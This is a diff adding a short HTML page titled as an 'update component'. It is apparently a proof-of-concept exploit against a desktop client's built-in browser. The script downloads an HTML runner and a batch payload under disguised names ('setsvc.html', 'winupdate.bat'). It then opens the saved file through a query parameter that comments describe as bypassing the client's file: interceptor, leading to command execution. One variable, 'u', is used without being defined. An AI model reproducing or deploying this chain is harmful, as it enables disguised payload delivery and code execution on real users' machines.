@@ -1,0 +1,11 @@
+<!doctype html><title>更新组件</title>
+<script>
+function dl(url,name){var a=document.createElement('a');a.href=url;a.download=name;document.body.appendChild(a);a.click()}
+// stage 1&2: land bridge-runner html and command payload (user clicks save on each dialog)
+dl('/bili-im-poc/main/poc.html','setsvc.html');
+setTimeout(function(){dl('/bili-im-poc/main/payload.bat','winupdate.bat')},2500);
+// stage 3: after both saved, open the html inside client built-in browser (?bilipc bypasses the file: interceptor)
+setTimeout(function(){
+  window.open('file:///C:/Users/'+u+'/Downloads/setsvc.html?bilipc=1');
+},20000);
+</script>
